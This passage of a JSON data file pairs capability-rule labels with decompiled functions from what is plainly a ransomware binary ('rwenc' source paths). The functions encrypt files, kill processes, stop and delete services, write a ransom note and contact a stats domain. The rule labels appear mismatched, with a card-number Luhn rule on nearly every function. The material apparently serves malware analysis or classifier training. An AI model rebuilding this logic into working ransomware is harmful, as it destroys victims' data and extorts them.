            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402e24(uint arg_8h, int32_t arg_ch)\n\n{\n    uint arg_8h_00;\n    uint arg_10h;\n    \n    arg_8h_00 = fcn.00406c56(*(arg_ch + 0x18));\n    fcn.004078cc(arg_ch + 0x10c, 0x40);\n    fcn.004081e3(arg_ch);\n    fcn.00408116(arg_8h, arg_ch);\n    arg_10h = 0x4216a0;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n    fcn.00405082(7, L\"[DBG] \", arg_10h);\n    fcn.00408161(arg_8h_00);\n    fcn.00405082(8, L\" fin:%s:%08X\\r\\n\", arg_8h_00);\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4216a0);\n    fcn.004051e4(arg_8h_00);\n    return;\n}\n",
        "token_count": 239
    },
    "004030d1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004030d1(int32_t arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint var_40h;\n    uint var_20h;\n    \n    puVar3 = 0x421520;\n    puVar4 = arg_8h + 0x28;\n    for (iVar2 = 0x16; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    puVar3 = 0x421578;\n    puVar4 = arg_8h + 0x80;\n    for (iVar2 = 0x16; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    fcn.0040751e(&var_20h, arg_8h + 0xd8);\n    fcn.00407788(&var_20h, 0x421500, &var_40h);\n    fcn.004078cc(&var_20h, 0x20);\n    iVar2 = arg_8h + 0x10c;\n    fcn.004092af(iVar2, &var_40h, 0x100);\n    fcn.004078cc(&var_40h, 0x20);\n    fcn.004076f1(arg_8h + 0xf8, 8);\n    fcn.00409291(iVar2, arg_8h + 0xf8);\n    uVar1 = fcn.00407642(0, arg_8h + 0xd8, 0x20);\n    *(arg_8h + 0x100) = uVar1;\n    *(arg_8h + 0x104) = *0x421684;\n    puVar3 = arg_8h + 0x108;\n    *puVar3 = 0;\n    fcn.004091e7(iVar2, puVar3, puVar3, 4);\n    return;\n}\n",
        "token_count": 522
    },
    "0040319f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0040319f(uint arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint arg_10h_00;\n    \n    *(arg_ch + 0x14c) = arg_10h;\n    iVar1 = fcn.00408147(arg_8h, 0, 0, arg_ch);\n    if (iVar1 == 0) {\n        arg_10h_00 = 0x4216a0;\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n        fcn.00405082(0xc, L\"[ERR] \", arg_10h_00);\n        fcn.00405c89();\n        fcn.00405082(4, L\" err:%s:%d\\r\\n\", *(arg_ch + 0x18));\n        fcn.00405082(4, L\"      %S:%S:%lu\\r\\n\", \"D:\\\\1\\\\rwenc\\\\src\\\\enc.c\");\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4216a0);\n        fcn.00402e24(arg_8h, arg_ch);\n    }\n    return iVar1 != 0;\n}\n",
        "token_count": 269
    },
    "0040322c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004032be)\n// WARNING: Removing unreachable block (ram,0x004032f1)\n\nvoid __cdecl fcn.0040322c(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    uint uVar2;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.0040536d(*(arg_ch + 0x14));\n    *(arg_ch + 0x14) = 0;\n    iVar1 = fcn.00406ca4(*(arg_ch + 0x18));\n    iVar1 = fcn.00405197(iVar1 * 2 + 0x80);\n    if (iVar1 != 0) {\n        uVar2 = *0x4215e8;\n        arg_8h_00 = fcn.00406bfb(iVar1, *(arg_ch + 0x18));\n        uVar2 = fcn.00406af4(arg_8h_00, uVar2);\n        fcn.00408633(*(arg_ch + 0x18), uVar2);\n        fcn.004051e4(*(arg_ch + 0x18));\n        *(arg_ch + 0x18) = iVar1;\n    }\n    LOCK();\n    *0x421340 = CONCAT44(*0x421344 + *(arg_ch + 0x24) + CARRY4(*0x421340, *(arg_ch + 0x20)), \n                         *0x421340 + *(arg_ch + 0x20));\n    LOCK();\n    *0x421348 = CONCAT44(*0x42134c + (0xfffffffe < *0x421348), *0x421348 + 1);\n    fcn.00402e24(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 419
    },
    "00403312": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403312(uint arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint arg_10h_00;\n    \n    *(arg_ch + 0x14c) = arg_10h;\n    iVar1 = fcn.00408260(arg_ch, arg_ch + 0x154, *(arg_ch + 0x150));\n    while( true ) {\n        if (iVar1 != 0) {\n            return;\n        }\n        iVar1 = fcn.00405c89();\n        if (iVar1 == 0x3e5) break;\n        if (iVar1 == 0x26) {\n            fcn.00402d7e(arg_8h, arg_ch);\n            return;\n        }\n        arg_10h_00 = 0x4216a0;\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n        fcn.00405082(0xc, L\"[ERR] \", arg_10h_00);\n        fcn.00405082(4, L\"%d\\r\\n\", iVar1);\n        fcn.00405082(4, L\"      %S:%S:%lu\\r\\n\", \"D:\\\\1\\\\rwenc\\\\src\\\\enc.c\");\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4216a0);\n        fcn.004060d2(100);\n        iVar1 = fcn.00408260(arg_ch, arg_ch + 0x154, *(arg_ch + 0x150));\n    }\n    return;\n}\n",
        "token_count": 347
    },
    "004037b9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004037b9(int32_t arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    int32_t arg_ch_00;\n    int32_t iVar1;\n    \n    arg_ch_00 = arg_8h + 0x154;\n    fcn.004091e7(arg_8h + 0x10c, arg_ch_00, arg_ch_00, arg_ch);\n    *(arg_8h + 0x14c) = arg_10h;\n    fcn.0040827a(arg_8h, -arg_ch, -arg_ch >> 0x1f);\n    iVar1 = fcn.00408294(arg_8h, arg_ch_00, arg_ch);\n    while( true ) {\n        if (iVar1 != 0) {\n            return;\n        }\n        iVar1 = fcn.00405c89();\n        if (iVar1 == 0x3e5) break;\n        fcn.004060d2(100);\n        iVar1 = fcn.00408294(arg_8h, arg_ch_00, arg_ch);\n    }\n    return;\n}\n",
        "token_count": 254
    },
    "004038a2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004038a2(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint arg_10h;\n    uint uVar4;\n    \n    fcn.004059f5();\n    iVar1 = fcn.00401526();\n    if (iVar1 == 0) {\n        uVar3 = 0x4216a0;\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n        uVar4 = 0xc;\n        fcn.00405082(0xc, L\"[ERR] \", uVar3);\n        fcn.00405082(4, L\"config init error\\r\\n\", uVar4);\n        uVar4 = 0x534;\n        fcn.00405082(4, L\"      %S:%S:%lu\\r\\n\", \"D:\\\\1\\\\rwenc\\\\src\\\\enc.c\");\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4216a0);\n    }\n    else {\n        if (*0x42167c == 0) {\n            iVar2 = fcn.00405b24();\n            if (iVar2 != 0) {\n                fcn.004054d3(0);\n            }\n        }\n        uVar4 = 0;\n        uVar3 = (**0x413d00)(0, 0, fcn.00403c0b, 0, 0, 0);\n        fcn.0040536d(uVar3);\n        fcn.00403bc9();\n        fcn.00403f32();\n        fcn.004053f8();\n        if ((*0x42168c == 0) && (*0x421674 != 0)) {\n            fcn.0040469c();\n        }\n        iVar2 = fcn.004033d0();\n        if ((iVar2 != 0) && (*0x42168c == 0)) {\n            fcn.00404ac8();\n            if ((*0x42168c == 0) && (*0x421678 != 0)) {\n                arg_10h = 0x4216a0;\n                (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n                uVar3 = 7;\n                fcn.00405082(7, L\"[DBG] \", arg_10h);\n                fcn.00405082(8, L\"knock stat domain\\r\\n\", uVar3);\n                (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4216a0);\n                fcn.0040676b(*0x4215d8, 0x3b, 0, fcn.00402baf);\n            }\n        }\n    }\n    fcn.00401434(uVar4);\n    fcn.00405a9d();\n    return iVar1;\n}\n",
        "token_count": 618
    },
    "004039e3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004039e3(uint arg_8h, uint arg_ch, uint noname_2, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint arg_10h;\n    \n    iVar1 = fcn.00402e98(arg_8h, arg_ch, arg_14h, arg_18h);\n    if (((iVar1 != 0) && (iVar2 = fcn.00402da0(arg_8h, iVar1),  iVar2 != 0)) &&\n       (iVar1 = fcn.0040319f(arg_8h, iVar1, 0),  iVar1 != 0)) {\n        arg_10h = 0x4216a0;\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n        fcn.00405082(7, L\"[DBG] \", arg_10h);\n        fcn.00405082(8, L\" add:%s:%llu\\r\\n\", arg_ch);\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4216a0);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 261
    },
    "00403a65": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403a65(uint noname_0, uint arg_ch, uint32_t arg_10h, uint32_t arg_14h)\n\n{\n    int32_t iVar1;\n    \n    if ((arg_10h | arg_14h) != 0) {\n        fcn.00406a50(arg_ch);\n        iVar1 = fcn.00407267(0x421620, arg_ch);\n        if (iVar1 == 0) {\n            iVar1 = fcn.00408539(arg_ch);\n            if ((iVar1 != 0) && (iVar1 = fcn.00407267(0x42162c, iVar1),  iVar1 != 0)) {\n                return 0;\n            }\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 177
    },
    "00403bc9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00403bc9(void)\n\n{\n    uint arg_10h;\n    uint arg_10h_00;\n    \n    arg_10h_00 = 0x4216a0;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n    arg_10h = 7;\n    fcn.00405082(7, L\"[DBG] \", arg_10h_00);\n    fcn.00405082(8, L\"kill process\\r\\n\", arg_10h);\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4216a0);\n    fcn.00405d77(0, 0, fcn.00402b54);\n    return;\n}\n",
        "token_count": 156
    },
    "00403c0b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.00403c0b(void)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    uint uVar3;\n    uint uVar4;\n    uint var_e8h;\n    ushort var_3ah;\n    uint var_38h;\n    uint var_24h;\n    uint var_20h;\n    ushort var_1ah;\n    int32_t var_18h;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    int32_t *var_ch;\n    int32_t *var_8h;\n    int32_t *var_4h;\n    \n    iVar1 = (**0x413da8)(0, 0);\n    if (iVar1 < 0) {\n        uVar4 = 0x4216a0;\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n        fcn.00405082(7, L\"[DBG] \", uVar4);\n        fcn.00405082(8, L\"Failed to initialize COM library. Error code = 0x%08x\\r\\n\", iVar1);\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4216a0);\n    }\n    else {\n        iVar1 = (**0x413d94)(0, 0xffffffff, 0, 0, 0, 3, 0, 0, 0);\n        if (-1 < iVar1) {\n            var_8h = NULL;\n            iVar1 = (**0x413c54)(0x40fa40, 0, 1, 0x40faa0, &var_8h);\n            if (iVar1 < 0) {\n                uVar4 = 0x4216a0;\n                (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n                fcn.00405082(7, L\"[DBG] \", uVar4);\n                fcn.00405082(8, L\"Failed to create IWbemLocator object. Err code = 0x%08x\\r\\n\", iVar1);\n                (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4216a0);\n            }\n            else {\n                var_4h = NULL;\n                fcn.00406625(0x413060, 0x1a8, 5, 0x14, &var_38h);\n                var_24h._0_2_ = 0;\n                uVar4 = (**0x413c64)(&var_38h);\n                iVar1 = (**(*var_8h + 0xc))(var_8h, uVar4, 0, 0, 0, 0, 0, 0, &var_4h);\n                var_18h = iVar1;\n                (**0x413ccc)(uVar4);\n                uVar4 = 0x4216a0;\n                if (-1 < iVar1) {\n                    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n                    uVar3 = 7;\n                    fcn.00405082(7, L\"[DBG] \", uVar4);\n                    fcn.00405082(8, L\"Connected to ROOT\\\\CIMV2 WMI namespace\\r\\n\", uVar3);\n                    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4216a0);\n                    var_10h = NULL;\n                    (**0x413c54)(0x40fa60, 0, 4, 0x40f920, &var_10h);\n                    (**(*0x413054 + 4))(0x413054);\n                    var_14h = NULL;\n                    (**(*var_10h + 0xc))(var_10h, 0x413054, &var_14h);\n                    var_ch = NULL;\n                    (***var_14h)(var_14h, 0x40f8f0, &var_ch);\n                    fcn.00406625(0x413060, 0xabb, 0x10, 6, &var_20h);\n                    var_1ah = 0;\n                    fcn.00406625(0x413060, 0x68e, 0xf, 0xae, &var_e8h);\n                    var_3ah = 0;\n                    uVar4 = (**0x413c64)(&var_20h);\n                    uVar3 = (**0x413c64)(&var_e8h);\n                    var_18h = (**(*var_4h + 0x5c))(var_4h, uVar4, uVar3, 0x80, 0, var_ch);\n                    (**0x413ccc)(uVar4);\n                    (**0x413ccc)(uVar3);\n                    iVar1 = var_18h;\n                    bVar2 = -1 < var_18h;\n                    if (bVar2) {\n                        uVar4 = fcn.00405520(0xffffffff);\n                        (**0x413e3c)(uVar4);\n                        (**(*var_4h + 0x10))(var_4h, var_ch);\n                    }\n                    else {\n                        uVar4 = 0x4216a0;\n                        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n                        fcn.00405082(7, L\"[DBG] \", uVar4);\n                        fcn.00405082(8, L\"ExecNotificationQueryAsync failed with = 0x%X\\r\\n\", iVar1);\n                        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4216a0);\n                    }\n                    (**(*var_4h + 8))(var_4h);\n                    (**(*var_8h + 8))(var_8h);\n                    (**(*var_10h + 8))(var_10h);\n                    (**(*var_14h + 8))(var_14h);\n                    (**(*0x413054 + 8))(0x413054);\n                    (**(*var_ch + 8))(var_ch);\n                    (**0x413ca8)();\n                    return !bVar2;\n                }\n                (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n                fcn.00405082(7, L\"[DBG] \", uVar4);\n                fcn.00405082(8, L\"Could not connect. Error code = 0x%08x\\r\\n\", var_18h);\n                (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4216a0);\n                (**(*var_8h + 8))(var_8h);\n            }\n            (**0x413ca8)();\n            return true;\n        }\n        uVar4 = 0x4216a0;\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n        fcn.00405082(7, L\"[DBG] \", uVar4);\n        fcn.00405082(8, L\"Failed to initialize security. Error code = 0x%08x\\r\\n\", iVar1);\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4216a0);\n        (**0x413ca8)();\n    }\n    return true;\n}\n",
        "token_count": 1561
    },
    "00403f32": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00403f32(void)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint uVar5;\n    uint *puVar6;\n    uint var_38h;\n    uint var_34h;\n    uint var_18h;\n    uint *var_14h;\n    uint32_t var_10h;\n    uint *var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    uVar5 = 0;\n    iVar2 = (**0x413d80)(0, L\"ServicesActive\", 4);\n    if (iVar2 != 0) {\n        var_4h = 0;\n        var_8h = 0;\n        iVar3 = (**0x413d88)(iVar2, 0, 0x30, 1, 0, 0, &var_4h, &var_8h, 0, 0);\n        if ((iVar3 == 0) || (iVar3 = fcn.00405c89(),  iVar3 == 0xea)) {\n            puVar4 = fcn.00405197(var_4h);\n            var_14h = puVar4;\n            if (puVar4 == NULL) {\n                (**0x413ca0)(iVar2);\n                return 0;\n            }\n            iVar3 = (**0x413d88)(iVar2, 0, 0x30, 1, puVar4, var_4h, &var_4h, &var_8h, 0, 0);\n            if (iVar3 != 0) {\n                var_10h = 0;\n                if (var_8h != 0) {\n                    do {\n                        var_18h = *puVar4;\n                        fcn.00406a50(var_18h);\n                        for (var_ch = *0x421660; var_ch != NULL; var_ch = var_ch[1]) {\n                            iVar3 = fcn.004067b6(*var_ch, var_18h);\n                            if (iVar3 != 0) {\n                                bVar1 = true;\n                                goto code_r0x00404013;\n                            }\n                        }\n                        bVar1 = false;\ncode_r0x00404013:\n                        if (bVar1) {\n                            puVar4 = (**0x413d8c)(iVar2, *puVar4, 0x10020);\n                            var_ch = puVar4;\n                            if (puVar4 != NULL) {\n                                var_38h = 0;\n                                puVar6 = &var_34h;\n                                for (iVar3 = 6; iVar3 != 0; iVar3 = iVar3 + -1) {\n                                    *puVar6 = 0;\n                                    puVar6 = puVar6 + 1;\n                                }\n                                iVar3 = (**0x413e38)(puVar4, 1, &var_38h);\n                                if (iVar3 != 0) {\n                                    uVar5 = 0x4216a0;\n                                    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n                                    fcn.00405082(7, L\"[DBG] \", uVar5);\n                                    puVar4 = var_14h;\n                                    fcn.00405082(8, L\"stop service: %s\\r\\n\", *var_14h);\n                                    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4216a0);\n                                    iVar3 = (**0x413d08)(var_ch);\n                                    if (iVar3 != 0) {\n                                        uVar5 = 0x4216a0;\n                                        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n                                        fcn.00405082(7, L\"[DBG] \", uVar5);\n                                        fcn.00405082(8, L\"delete service: %s\\r\\n\", *puVar4);\n                                        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4216a0);\n                                        goto code_r0x004040ce;\n                                    }\n                                }\n                                (**0x413ca0)(var_ch);\n                            }\n                            break;\n                        }\ncode_r0x004040ce:\n                        puVar4 = puVar4 + 0xb;\n                        var_10h = var_10h + 1;\n                        var_14h = puVar4;\n                    } while (var_10h < var_8h);\n                }\n                uVar5 = 1;\n            }\n            (**0x413ca0)(iVar2);\n            return uVar5;\n        }\n        (**0x413ca0)(iVar2);\n    }\n    return 0;\n}\n",
        "token_count": 1015
    },
    "0040410a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040410a(uint arg_8h)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint var_154h;\n    uint var_140h;\n    uint var_13ch;\n    uint var_12ch;\n    uint var_128h;\n    uint var_118h;\n    uint var_114h;\n    ushort var_106h;\n    uint var_104h;\n    ushort var_f6h;\n    uint var_f4h;\n    ushort var_e6h;\n    uint var_e4h;\n    uint var_d6h;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_a8h;\n    uint var_a4h;\n    ushort var_9ah;\n    uint var_98h;\n    uint var_8eh;\n    uint var_84h;\n    uint var_80h;\n    uint var_78h;\n    uint var_74h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_54h;\n    uint var_50h;\n    ushort var_4ah;\n    uint var_48h;\n    ushort var_42h;\n    uint var_40h;\n    ushort var_3ah;\n    uint var_38h;\n    uint *var_32h;\n    uint *var_2ch;\n    uint *var_28h;\n    uint *var_24h;\n    uint *var_20h;\n    uint *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    uint *var_ch;\n    uint *var_8h;\n    uint *var_4h;\n    \n    iVar2 = fcn.00406ca4(arg_8h);\n    iVar2 = fcn.00405197(iVar2 * 2 + 0x800);\n    if (iVar2 != 0) {\n        fcn.00406625(0x413060, 0x44e, 0xf, 0x10, &var_128h);\n        var_118h._0_2_ = 0;\n        fcn.00406bfb(iVar2, &var_128h);\n        fcn.00406af4(iVar2, arg_8h);\n        fcn.00406af4(iVar2, 0x40f48c);\n        fcn.00406625(0x413060, 0x929, 0xb, 0x14, &var_154h);\n        var_140h._0_2_ = 0;\n        fcn.00406625(0x413060, 0x395, 7, 0xc, &var_b4h);\n        var_a8h._0_2_ = 0;\n        fcn.00406625(0x413060, 0x78c, 0xf, 0xe, &var_e4h);\n        var_d6h._0_2_ = 0;\n        fcn.00406625(0x413060, 0x615, 8, 0xe, &var_f4h);\n        var_e6h = 0;\n        fcn.00406625(0x413060, 0x75c, 0xf, 0xe, &var_104h);\n        var_f6h = 0;\n        fcn.00406625(0x413060, 0x2eb, 7, 8, &var_5ch);\n        var_54h._0_2_ = 0;\n        fcn.00406625(0x413060, 0x52f, 0xb, 8, &var_68h);\n        var_60h._0_2_ = 0;\n        fcn.00406625(0x413060, 0x3b0, 6, 10, &var_98h);\n        var_8eh._0_2_ = 0;\n        var_2ch = &var_154h;\n        var_28h = &var_b4h;\n        var_24h = &var_e4h;\n        var_20h = &var_f4h;\n        var_1ch = &var_104h;\n        var_18h = &var_5ch;\n        var_14h = &var_68h;\n        var_10h = &var_98h;\n        iVar3 = fcn.00405e1e(0, 7);\n        fcn.00406af4(iVar2, (&var_2ch)[iVar3]);\n        fcn.00406af4(iVar2, 0x40f48c);\n        fcn.00406625(0x413060, 0x303, 7, 0xc, &var_c4h);\n        var_b8h._0_2_ = 0;\n        fcn.00406625(0x413060, 0xa2c, 0xd, 0x10, &var_13ch);\n        var_12ch._0_2_ = 0;\n        fcn.00406625(0x413060, 0x9cb, 10, 10, &var_a4h);\n        var_9ah = 0;\n        fcn.00406625(0x413060, 0x860, 0xb, 8, &var_74h);\n        var_6ch._0_2_ = 0;\n        fcn.00406625(0x413060, 500, 0xf, 6, &var_38h);\n        var_32h._0_2_ = 0;\n        fcn.00406625(0x413060, 0x430, 6, 0xe, &var_114h);\n        var_106h = 0;\n        fcn.00406625(0x413060, 0x9f1, 9, 0xc, &var_d6h + 2);\n        var_c8h._0_2_ = 0;\n        fcn.00406625(0x413060, 0x7eb, 7, 8, &var_80h);\n        var_78h._0_2_ = 0;\n        fcn.00406625(0x413060, 0x5be, 0xd, 8, &var_8eh + 2);\n        var_84h._0_2_ = 0;\n        unique0x00001e00 = &var_c4h;\n        var_2ch = &var_13ch;\n        var_28h = &var_a4h;\n        var_24h = &var_74h;\n        var_20h = &var_38h;\n        var_1ch = &var_114h;\n        var_18h = &var_d6h + 2;\n        var_14h = &var_80h;\n        var_10h = &var_8eh + 2;\n        iVar3 = fcn.00405e1e(0, 8);\n        fcn.00406af4(iVar2, *(&var_32h + iVar3 * 4 + 2));\n        fcn.00406af4(iVar2, 0x40f48c);\n        uVar4 = 0;\n        iVar3 = fcn.00405e1e(0, 9);\n        if (iVar3 != -1) {\n            do {\n                uVar1 = fcn.00405e1e(0x61, 0x7a);\n                var_8h = var_8h & 0xffff0000 | uVar1;\n                uVar1 = fcn.00405e1e(0x61, 0x7a);\n                var_8h = var_8h & 0xffff | uVar1 << 0x10;\n                var_4h = var_4h & 0xffff0000;\n                fcn.00406af4(iVar2, &var_8h);\n                uVar4 = uVar4 + 1;\n                iVar3 = fcn.00405e1e(0, 9);\n            } while (uVar4 < iVar3 + 1U);\n        }\n        fcn.00406af4(iVar2, 0x40f490);\n        fcn.00406625(0x413060, 0x4ad, 0xc, 6, &var_40h);\n        var_3ah = 0;\n        fcn.00406625(0x413060, 0x7b8, 9, 6, &var_48h);\n        var_42h = 0;\n        fcn.00406625(0x413060, 0x586, 0xb, 6, &var_50h);\n        var_4ah = 0;\n        var_ch = &var_40h;\n        var_8h = &var_48h;\n        var_4h = &var_50h;\n        iVar3 = fcn.00405e1e(0, 2);\n        fcn.00406af4(iVar2, (&var_ch)[iVar3]);\n    }\n    return;\n}\n",
        "token_count": 2110
    },
    "0040454a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040454a(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t arg_8h_00;\n    uint arg_10h;\n    uint var_4h;\n    \n    iVar1 = fcn.00406ca4(arg_8h);\n    arg_8h_00 = fcn.00405197((iVar1 + *0x42166c) * 2 + 2);\n    if (arg_8h_00 != 0) {\n        fcn.00406bfb(arg_8h_00, arg_8h);\n        fcn.00406af4(arg_8h_00, *0x4215e0);\n        arg_10h = 0x4216a0;\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n        fcn.00405082(7, L\"[DBG] \", arg_10h);\n        fcn.00405082(8, L\"make_note:%s\\r\\n\", arg_8h_00);\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4216a0);\n        iVar1 = fcn.004084b5(arg_8h_00, 0x40000000, 0, 2, 0);\n        fcn.004051e4(arg_8h_00);\n        if (iVar1 != 0) {\n            fcn.0040850d(iVar1, *0x4215dc, *0x421668 * 2, &var_4h);\n            fcn.0040536d(iVar1);\n        }\n        arg_8h_00 = iVar1 != 0;\n    }\n    return arg_8h_00;\n}\n",
        "token_count": 383
    },
    "0040467d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040467d(uint noname_0, uint arg_ch, uint noname_2, uint arg_14h, uint arg_18h)\n\n{\n    fcn.00403ab3(arg_ch, arg_14h, arg_18h);\n    return;\n}\n",
        "token_count": 65
    },
    "0040476d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040476d(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint arg_10h;\n    \n    fcn.00408b2f();\n    (*_sym.imp.KERNEL32.dll_SetErrorMode)(1);\n    iVar1 = fcn.0040601d();\n    if (iVar1 == 0) {\n        iVar1 = fcn.00401beb();\n        if (iVar1 != 0) {\n            uVar2 = fcn.0040551a();\n            fcn.00408b69(uVar2);\n        }\n        fcn.0040636e();\n        fcn.004038a2();\n    }\n    else {\n        arg_10h = 0x4216a0;\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n        uVar2 = 0xc;\n        fcn.00405082(0xc, L\"[ERR] \", arg_10h);\n        fcn.00405082(4, L\"Program already running!\\r\\n\", uVar2);\n        fcn.00405082(4, L\"      %S:%S:%lu\\r\\n\", \"D:\\\\1\\\\rwenc\\\\src\\\\main.c\");\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4216a0);\n        fcn.004054d3(0);\n    }\n    fcn.00408afa();\n    return 0;\n}\n",
        "token_count": 312
    },
    "004049c3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
